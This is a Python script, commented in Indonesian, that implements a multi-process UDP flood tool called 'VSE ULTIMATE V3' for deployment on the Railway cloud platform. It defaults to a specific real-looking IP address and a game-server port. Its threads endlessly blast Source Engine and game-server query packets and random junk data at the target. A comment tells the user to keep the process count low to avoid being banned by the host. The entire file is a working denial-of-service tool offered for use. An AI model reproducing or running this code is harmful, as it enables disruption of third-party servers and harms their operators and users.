import multiprocessing
import threading
import socket
import random
import os
import sys
import time

# Ambil data dari Environment Variables Railway
# Biar kamu bisa ganti target lewat dashboard tanpa edit code
target_ip = os.getenv("TARGET_IP", "62.146.239.123")
target_port = int(os.getenv("TARGET_PORT", "30120"))
num_processes = int(os.getenv("PROCES", "22")) # Jangan terlalu banyak di Railway biar ga kena ban
threads_per_proc = int(os.getenv("THREADS", "5"))

PAYLOADS = [
    b'\xff\xff\xff\xffTSource Engine Query\x00',
    b'\xff\xff\xff\xffgetstatus',
    b'\xff\xff\xff\xffgetinfo',
    b'\xff\xff\xff\xffdetails',
    b'\xff\xff\xff\xffU',
    b'\xff\xff\xff\xff\x56',
]

def extreme_flood(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048*1024)
    trash_data = [random._urandom(random.randint(1200, 1472)) for _ in range(10)]
    
    while True:
        try:
            s.sendto(random.choice(PAYLOADS), (ip, port))
            s.sendto(random.choice(trash_data), (ip, port))
            if random.random() > 0.8:
                s.sendto(random.choice(trash_data), (ip, port + 1))
        except:
            pass

def worker(ip, port, threads_per_proc):
    threads = []
    for _ in range(threads_per_proc):
        t = threading.Thread(target=extreme_flood, args=(ip, port), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    print(f"--- VSE ULTIMATE V3 : RAILWAY DEPLOY ---")
    print(f"Target : {target_ip}:{target_port}")
    
    # Jalankan pasukan proses
    for _ in range(num_processes):
        p = multiprocessing.Process(target=worker, args=(target_ip, target_port, threads_per_proc))
        p.daemon = True
        p.start()

    while True:
        time.sleep(10)